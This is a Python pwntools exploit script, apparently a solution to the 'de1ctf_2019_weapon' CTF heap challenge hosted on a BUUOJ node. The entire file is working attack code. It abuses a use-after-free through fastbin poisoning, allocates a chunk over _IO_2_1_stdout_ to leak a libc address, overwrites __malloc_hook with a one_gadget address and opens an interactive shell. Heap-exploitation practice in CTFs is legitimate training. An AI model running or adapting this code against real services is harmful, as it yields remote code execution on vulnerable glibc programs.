from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./de1ctf_2019_weapon"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 28686)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size, index, name):
    sla("choice >> \n", "1")
    sla("wlecome input your size of weapon: ", str(size))
    sla("input index: ", str(index))
    sa("input your name:\n", name)

def free(index):
    sla("choice >> \n", "2")
    sla("input idx :", str(index))

def edit(index, con):
    sla("choice >> \n", "3")
    sla("input idx: ", str(index))
    sa("new content:\n", con)


# uaf

# fastbin attack 
add(0x40, 0, "a")
add(0x40, 1, "a")
add(0x10, 2, "a")
add(0x10, 3, "a")
add(0x10, 4, "a")
free(0)
free(1)
edit(1, p8(0x10))
edit(0, p64(0)+p64(0x51))

# leave main_arena in fastbin
add(0x40, 5, "a")
add(0x40, 6, cyclic(0x30)+p64(0)+p64(0x71))
free(1)
edit(6, cyclic(0x30)+p64(0)+p64(0x91))
free(1)

# alloc to _IO_2_1_stdout_, this need to burst
io_stdout = 0x8620-0x40-0x3
edit(6, cyclic(0x30)+p64(0)+p64(0x71))
edit(1, p16(io_stdout))
add(0x60, 7, "a")
add(0x60, 8, cyclic(0x33)+p64(0xfbad3887)+p64(0)*3+p8(0))

# leak and count
info = u64(ru("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))

libc = ELF(libc_path)
base = info-libc.sym["_IO_2_1_stderr_"]-192
print("base: ", hex(base))

m_hook = base+libc.sym["__malloc_hook"]
print("m_hook: ", hex(m_hook))
oneshot = base+0xf1147

# alloc to malloc_hook and modify malloc_hook to oneshot
edit(6, cyclic(0x30)+p64(0)+p64(0x11))
add(0x60, 0, "a")
add(0x60, 1, "a")
free(0)
free(1)

edit(1, p8(0x20))
edit(0, p64(0)*3+p64(0x71))
add(0x60, 2, "a")
add(0x60, 3, "a")

free(2)
edit(3, cyclic(0x40)+p64(0)+p64(0x71)+p64(m_hook-0x23))

add(0x60, 4, "a")
add(0x60, 5, cyclic(0x13)+p64(oneshot))

# attack
sla("choice >> ", "1")
sla("wlecome input your size of weapon: ", "16")
sla("input index: ", "0")

shell()


